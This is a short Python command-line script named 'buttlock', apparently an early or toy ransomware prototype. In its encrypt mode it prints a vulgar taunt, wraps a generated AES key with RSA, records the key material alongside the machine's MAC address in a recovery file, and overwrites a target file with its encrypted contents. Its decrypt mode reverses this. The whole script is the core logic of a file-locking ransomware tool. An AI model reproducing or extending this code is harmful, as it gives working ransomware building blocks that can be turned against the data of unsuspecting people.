from core import Buttcrypt, Buttnet
import base64
import click


@click.command()
@click.option("--mode", default="encrypt", help="buttlock mode. encrypt for encrypt disk and decrypt for decrypt disk")
def buttlock(mode):
    if mode == "encrypt":
        print("it's raining dicks down on your disk")
       
        buttcrypt = Buttcrypt.Buttcrypt()
        encrypted_aes_key = buttcrypt.RSAEncryptContent(buttcrypt.getAesKey())
        base64_private_key = base64.b64encode(buttcrypt.getPrivateKey())

        with open("./temp/buttlock_recovery", "wb+") as crypto_out:
            crypto_out.write(encrypted_aes_key)
            crypto_out.write(str(";").encode('utf-8'))
            crypto_out.write(str(Buttnet.getMacAddress()).encode('utf-8'))
            crypto_out.write(str(";").encode('utf-8'))
            crypto_out.write(base64_private_key)
        with open("./temp/butt.txt", "rb") as in_file:
            encrypted_content = buttcrypt.encryptContent(in_file.read())
            with open("./temp/butt.txt", "wb+") as out_file:
                out_file.write(encrypted_content)

    if mode == "decrypt":
        print("undick your disk")    

        with open("./temp/buttlock_recovery", "rb") as crypto_in:
            crypto_in_arr = crypto_in.read().decode("utf-8").split(";")
            
            encrypted_aes_key = crypto_in_arr[0].strip()
            mac_address = crypto_in_arr[1]
            private_key = base64.b64decode(crypto_in_arr[2].strip())

            buttcrypt = Buttcrypt.Buttcrypt()
            decrypted_aes_key = buttcrypt.RSADecryptContent(base64.b64decode(encrypted_aes_key), private_key)

            with open("./temp/butt.txt", "rb") as encrypted_input:
                decrypted = buttcrypt.decryptContent(decrypted_aes_key, encrypted_input.read())
                with open("./temp/butt.txt", "wb") as out_file:
                    out_file.write(decrypted)


if __name__ == '__main__':
    buttlock()